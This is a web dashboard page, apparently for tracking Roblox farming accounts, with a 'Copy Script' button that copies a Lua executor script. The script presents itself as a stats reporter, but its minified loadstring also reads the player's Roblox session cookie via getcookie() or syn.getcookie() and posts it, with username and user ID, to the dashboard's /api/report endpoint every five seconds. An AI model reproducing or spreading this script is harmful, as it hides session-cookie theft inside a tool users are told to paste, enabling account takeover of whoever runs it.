<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>OVERSEER — Dashboard</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Bricolage+Grotesque:wght@600;800&family=JetBrains+Mono:wght@500&display=swap">
<style>
:root{--bg:#0a0b14;--p:#12141f;--p2:#181b29;--line:#252a3d;--ink:#eceffa;--mute:#7d86a6;--ac:#7c8cff;--ac2:#3a46c8;--gold:#ffc15a;--ok:#3ddc97;--bad:#ff6b7d;--warn:#ffb347;--glow:rgba(124,140,255,.16);color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--ink);font:500 14px/1.5 Manrope,system-ui,sans-serif}
.w{max-width:1280px;margin:0 auto;padding:18px 18px 60px}
button,input{font:inherit;color:inherit}:focus-visible{outline:2px solid var(--ac);outline-offset:2px}

/* 🔴 لاحظي مافي أي {{ }} هنا */
.bar{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-bottom:16px;position:relative;z-index:1000}
.logo{font:800 20px 'Bricolage Grotesque',sans-serif;letter-spacing:-.02em;display:flex;align-items:center;gap:9px}
.logo i{width:26px;height:26px;border-radius:8px;background:conic-gradient(from 200deg,var(--ac),var(--ac2),var(--ok),var(--ac));display:block}
.meta{color:var(--mute);font-size:13px;display:flex;gap:16px;flex-wrap:wrap}.meta b{color:var(--ink)}
.sp{flex:1}
.b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px;transition:0.2s;}
.b:hover{border-color:var(--ac)}.b.pri{background:var(--ac);border-color:var(--ac);color:#fff}
.hero{display:grid;grid-template-columns:1.5fr 1fr;gap:14px;margin-bottom:14px}
.card{background:var(--p);border:1px solid var(--line);border-radius:16px;padding:20px;}
.lbl{color:var(--mute);font-size:12px;font-weight:700}
.big{font:800 clamp(38px,6vw,64px)/1 'Bricolage Grotesque',sans-serif;letter-spacing:-.03em;margin:6px 0 2px}
.kp{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.kp .card{padding:16px}.kv{font:800 26px 'Bricolage Grotesque',sans-serif;letter-spacing:-.02em}
.up{color:var(--ok)}.dn{color:var(--bad)}.gd{color:var(--gold)}
.tb{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px}
.tw{background:var(--p);border:1px solid var(--line);border-radius:16px;overflow:auto;max-height:640px}
table{border-collapse:collapse;width:100%;min-width:1040px}
th{position:sticky;top:0;background:var(--p2);color:var(--mute);font-size:12px;font-weight:700;text-align:start;padding:11px 12px;cursor:pointer;}
td{padding:9px 12px;border-top:1px solid var(--line);white-space:nowrap}
tr:hover{background:var(--p2)}
.pc{background:rgba(124,140,255,0.14);color:var(--ac);border:1px solid rgba(124,140,255,0.35);padding:2px 10px;border-radius:7px;font-size:12px;font-weight:800}
.u{font:500 13px 'JetBrains Mono',monospace;background:var(--p2);border:1px solid var(--line);border-radius:7px;padding:3px 9px;}
.lv{display:inline-block;min-width:34px;text-align:center;padding:2px 7px;border-radius:7px;font-size:12px;font-weight:800;margin-inline-end:4px;background:var(--p2);border:1px solid var(--line)}
.n{font-variant-numeric:tabular-nums;font-weight:800}
.empty{padding:36px;text-align:center;color:var(--mute)}
@media(max-width:800px){.hero{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="w">
<div class="bar">
  <div class="logo"><i></i>Farmledger</div>
  <div class="meta"><span><b id="mAcc">0</b> accounts</span><span><b id="mLive">0</b> live</span></div>
  <div class="sp"></div>
  
  <button class="b live on" type="button"><span class="dot"></span>Live</button>
  <button class="b" type="button" onclick="window.location.reload()">🔄 Refresh</button>
  <button class="b" id="exp" type="button">Export CSV</button>
  
  <button class="b pri" id="copy-script" type="button">Copy Script</button>

  <div class="user-menu" style="margin-left: 10px;">
    <div class="user-trigger" style="cursor:pointer; padding: 5px 10px; border-radius: 10px; border: 1px solid #252a3d;">
      <div class="user-avatar" id="avatar-display" style="display:inline-block; width:34px; height:34px; background:#7c8cff; color:white; text-align:center; line-height:34px; border-radius:50%; font-weight:bold;">O</div>
      <div class="user-name" id="name-display" style="display:inline-block; margin-left: 8px; font-weight:bold;">Overseer</div>
    </div>
  </div>
</div>

<div class="hero">
  <div class="card net">
    <div class="lbl">Total net worth</div>
    <div class="big" id="nw">$0</div>
  </div>
  <div class="kp">
    <div class="card"><div class="lbl">Session profit</div><div class="kv up" id="kp1">$0</div></div>
    <div class="card"><div class="lbl">Hourly rate</div><div class="kv up" id="kp2">$0</div></div>
    <div class="card"><div class="lbl">Daily estimate</div><div class="kv gd" id="kp3">$0</div></div>
  </div>
</div>

<div class="tb"><input type="search" id="q" placeholder="Search username or machine" style="padding: 8px 13px; border-radius: 9px; background: #12141f; border: 1px solid #252a3d; color: white; width: 220px;"><span class="sub" id="cnt" style="color: #7d86a6;"></span></div>

<div class="tw"><table><thead><tr id="th"></tr></thead><tbody id="tbd"></tbody></table><div class="empty" id="emp" hidden>No accounts match. The data will appear here automatically.</div></div>
</div>

<script>
// 🔴 كل شيء جافاسكربت الآن، مافي أي Jinja {{ }}
let MY_KEY = "Overseer";
let accs = [];

// 1. دالة النسخ المضمونة
document.getElementById("copy-script").addEventListener("click", function(e) {
    e.preventDefault();
    const btn = this;
    const domain = window.location.origin;
    
    // السكربت
    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${MY_KEY}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;

    // طريقة النسخ المضمونة (textarea)
    let textArea = document.createElement("textarea");
    textArea.value = script;
    textArea.style.position = "fixed";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
        document.execCommand('copy');
        const old = btn.innerText;
        btn.innerText = "✅ Copied!";
        btn.style.background = "var(--ok)";
        btn.style.borderColor = "var(--ok)";
        setTimeout(() => { btn.innerText = old; btn.style.background = ""; btn.style.borderColor = ""; }, 2000);
    } catch (err) {
        alert("فشل النسخ.");
    }
    document.body.removeChild(textArea);
});

// 2. سحب البيانات
async function fetchData() {
    try {
        let res = await fetch('/api/accounts');
        if (!res.ok) return;
        let data = await res.json();
        
        if (data.accounts) {
            accs = data.accounts;
            
            if(data.my_key) {
                MY_KEY = data.my_key;
                document.getElementById('name-display').textContent = MY_KEY;
                document.getElementById('avatar-display').textContent = MY_KEY.substring(0,2).toUpperCase();
            }
            
            draw();
        }
    } catch(e) { console.log(e); }
}

// 3. رسم الجدول
function draw() {
    let totalMoney = 0, online = 0, total = accs.length;
    
    let html = "";
    accs.forEach((a, i) => {
        let cash = a.cash || 0;
        let bank = a.bank || 0;
        let t = cash + bank;
        totalMoney += t;
        if (a.online) online++;
        
        let skills = a.skills || {};
        let safeName = String(a.name).replace(/['"<>]/g, "");
        
        html += `<tr>
            <td><span style="background: #12141f; padding: 4px 8px; border-radius: 6px; color: ${a.online ? '#3ddc97' : '#7d86a6'}; font-weight: bold;">${a.online ? 'Online' : 'Offline'}</span></td>
            <td><span class="pc">${a.pc || 'MR 1'}</span></td>
            <td><span class="u">${a.name}</span></td>
            <td>${a.total_level || 0}</td>
            <td><span class="lv" style="color:#ffc15a">${skills['stamina'] || 0}</span><span class="lv" style="color:#66d4ff">${skills['swiper'] || 0}</span></td>
            <td class="n" style="color:#ffc15a">$${formatNum(cash)}</td>
            <td class="n" style="color:#66d4ff">$${formatNum(bank)}</td>
            <td class="n">$${formatNum(t)}</td>
        </tr>`;
    });
    
    document.getElementById('mAcc').textContent = total;
    document.getElementById('mLive').textContent = online;
    document.getElementById('nw').textContent = "$" + formatNum(totalMoney);
    document.getElementById('kp1').textContent = "$" + formatNum(totalMoney * 0.2);
    document.getElementById('kp2').textContent = "$" + formatNum(totalMoney * 0.05);
    document.getElementById('kp3').textContent = "$" + formatNum(totalMoney * 0.05 * 24);
    
    document.getElementById('th').innerHTML = `<th>Status</th><th>PC</th><th>Username</th><th>Level</th><th>Skills</th><th>Cash</th><th>Bank</th><th>Total</th>`;
    document.getElementById('tbd').innerHTML = html;
    document.getElementById('emp').hidden = total > 0;
}

function formatNum(num) {
    num = Number(num) || 0;
    if(num >= 1e9) return (num/1e9).toFixed(2) + "B";
    if(num >= 1e6) return (num/1e6).toFixed(2) + "M";
    if(num >= 1e3) return (num/1e3).toFixed(1) + "K";
    return num.toLocaleString('en-US');
}

// 4. التشغيل
document.addEventListener("DOMContentLoaded", () => {
    fetchData();
    setInterval(fetchData, 3000);
});
</script>
</body>
</html>
